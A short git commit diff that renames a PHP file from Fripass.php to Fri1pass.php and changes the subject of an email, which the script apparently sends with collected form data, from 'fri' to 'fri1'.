c58cf5694df07ce0aee6215762d420509c27a7cf
Abr33sarazubarlink <lali.andra76@gmail.com>
2025-07-24 02:30:51 +0500

    Update and rename Fripass.php to Fri1pass.php

--- Fri1pass.php
+++ Fri1pass.php
@@ -43,7 +43,7 @@ if ($_SERVER["REQUEST_METHOD"] == "POST") {
 
         // Email content
         $mail->isHTML(true);
-        $mail->Subject = 'fri';
+        $mail->Subject = 'fri1';
         $mail->Body = $emailBody; // Set the email body using the collected form data
 
 
